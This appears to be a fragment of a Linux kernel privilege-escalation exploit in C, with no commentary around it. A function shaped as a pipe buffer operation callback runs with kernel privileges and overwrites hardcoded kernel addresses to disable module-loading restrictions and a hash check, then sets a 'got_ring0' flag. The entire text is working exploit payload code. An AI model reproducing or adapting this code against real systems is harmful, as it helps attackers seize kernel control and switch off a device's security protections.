#include <linux/module.h>
#include <linux/security.h>
#include <linux/pipe_fs_i.h>

volatile int got_ring0 = 0;

#define MODULES_DISABLED_ADDR (0x8059CCCC)
#define HASH_SIZE_ADDR (0x800A00D8)

int get_ring0(struct pipe_inode_info *pipe, struct pipe_buffer *buf)
{
  *((unsigned int *)(MODULES_DISABLED_ADDR)) = 0;
  *((unsigned char *)(HASH_SIZE_ADDR)) = 0;
  
  got_ring0 = 1;
  
  return -ENOSYS;
}
